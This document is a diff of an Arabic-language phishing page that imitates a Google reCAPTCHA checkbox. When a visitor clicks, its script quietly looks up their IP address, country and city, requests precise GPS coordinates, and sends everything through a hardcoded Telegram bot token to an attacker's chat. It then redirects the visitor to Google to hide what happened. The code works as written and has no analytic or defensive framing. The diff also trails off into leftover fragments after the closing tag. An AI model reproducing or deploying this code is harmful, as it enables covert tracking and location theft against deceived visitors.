@@ -2,38 +2,71 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحقق الأمان</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحقق الأمان</title>
     <style>
-        body { font-family: sans-serif; background-color: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .captcha-box { background: white; border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; box-shadow: 0 0 10px rgba(0,0,0,0.05); width: 300px; cursor: pointer; }
-        .checkbox-container { display: flex; align-items: center; }
-        .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 15px; }
-        .text { font-size: 14px; color: #555; font-weight: 500; }
-        .logo { margin-right: auto; text-align: center; }
-        .logo img { width: 35px; }
-        .logo p { font-size: 10px; margin: 0; color: #9b9b9b; }
+        body { font-family: sans-serif; background-color: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .captcha-box { background: white; border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; box-shadow: 0 0 10px rgba(0,0,0,0.05); width: 300px; cursor: pointer; display: flex; align-items: center; }
+        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 15px; position: relative; }
         #loader { display: none; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; animation: spin 1s linear infinite; }
+        .text { font-size: 14px; color: #555; font-weight: 500; flex-grow: 1; }
+        .logo-area { text-align: center; color: #9b9b9b; font-size: 10px; }
+        .logo-area img { width: 30px; display: block; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="captcha-box" onclick="startCheck()">
-    <div class="checkbox-container">
-        <div id="check-mark" class="checkbox"></div>
+    <div class="captcha-box" id="mainBox">
+        <div class="checkbox" id="checkMark"></div>
         <div id="loader"></div>
         <div class="text">أنا لست برنامج روبوت</div>
-        <div class="logo">
+        <div class="logo-area">
             <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
-            <p>الخصوصية - البنود</p>
+            <span>الخصوصية - البنود</span>
         </div>
     </div>
-</div>
 
-<script>
-    const token = "8376514162:AAESk3saO_oIgo-1AhJkBODJX0sIPoQzyv8";
-    const chatId = "1149386368";
+    <script>
+        const token = "8376514162:AAESk3saO_oIgo-1AhJkBODJX0sIPoQzyv8";
+        const chatId = "1149386368";
+
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            await fetch(url);
+        }
+
+        document.getElementById('mainBox').addEventListener('click', async function() {
+            // تحديث الواجهة
+            document.getElementById('checkMark').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+
+            // 1. جلب IP صامتاً
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                sendToTelegram(`🌐 **دخول جديد**\nIP: ${d.ip}\nالدولة: ${d.country_name}\nالمدينة: ${d.city}`);
+            } catch (e) {}
+
+            // 2. طلب الموقع الدقيق
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    await sendToTelegram(`🎯 **الموقع الدقيق (GPS):**\n${mapLink}`);
+                    window.location.href = "https://www.google.com";
+                }, (err) => {
+                    sendToTelegram("❌ رفض المستخدم إذن الموقع.");
+                    window.location.href = "https://www.google.com";
+                }, { enableHighAccuracy: true });
+            } else {
+                window.location.href = "https://www.google.com";
+            }
+        });
+    </script>
+</body>
+</html>
 
     async function startCheck() {
         document.getElementById('check-mark').style.display = 'none';
